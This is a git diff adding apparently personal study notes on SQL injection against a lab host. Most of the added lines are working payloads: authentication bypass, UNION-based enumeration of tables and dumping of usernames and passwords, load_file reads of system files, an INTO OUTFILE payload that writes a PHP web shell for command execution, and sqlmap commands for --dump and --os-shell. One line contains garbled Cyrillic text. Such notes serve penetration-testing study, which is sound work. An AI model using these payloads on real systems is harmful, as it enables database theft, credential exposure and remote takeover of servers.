@@ -103,24 +103,35 @@ select * from users where name = 'tom' and password = 'jones';
 - Bypass:
 select * from users where name = 'tom' or 1=1;#' and password = 'jones';  # the server reads only --> select * from users where name = 'tom' or 1=1;    ## all rows will be returned!
 - Some programming languages have functions that query the database and expect a single record. If these functions get more than one row, they will generate an error.
-- if there is limitation of one raw, we can use:
-select * from users where name = 'tom' or 1=1 LIMIT 1;#
+- if there is limitation of сховинг онлъ one raw, we can use:
+select * from users where name = 'tom' or 1=1 LIMIT 1;#   #MariaDB --> end with ";#"
 
 # Enumerate the DB
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+- Vulnerable Code:
+$sql = "SELECT id, name, text FROM feedback WHERE id=". $_GET['id'];
+- put ' after id in the URL --> error appears
+http://10.11.0.22/debug.php?id=1'                   #watch for errors
+## Column Number Enumeration
+http://10.11.0.22/debug.php?id=1 order by 1         # 2,3,4,.., // reach the number with different error Ex: Unknown column 4 --> so there are 3 columns
+## Understand the Layout of the Output
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, 3   #The page displays the position of the different columns
+# Extracting Data from DB
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, @@version     #Version of the DB in the third column
+## Output Current User with this query:
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, user()
+## Enumerate database tables and column structures through the information_schema
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables   Extract tables
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'     Extract Columns of table - users
+http://10.11.0.22/debug.php?id=1 union all select 1, username, password from users          #Extract fields of the columns from users table
+## From SQL Injection to Code Execution
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')    #A SQLi payload using the load_file function
+http://10.11.0.22/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'    #SQLi payload to write a PHP shell using the OUTFILE function //If this succeeds, the file should be placed in the web root
+### Let’s try to access the newly-created backdoor.php page with a cmd parameter such as ipconfig:
+10.11.0.22/backdoor.php?cmd=ipconfig  --> Web Shell with ipconfig info 
+## Automating SQLi
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id"    # -u - URL // -p - specify parameter
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --dump        #--dbms to set “MySQL” as the backend type //--dump to dump the contents of all tables in the database //Sqlmap supports several backend databases in the --dbms flag but it doesn’t make a distinction between MariaDB and MySQL. Setting “MySQL” will work well enough for this example.
+sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --osshell     #--os-shell to execute a shell on the system //in sqlmap we are asked for commands ex:ipconfig --> we receive the output of our commands
 
 
 
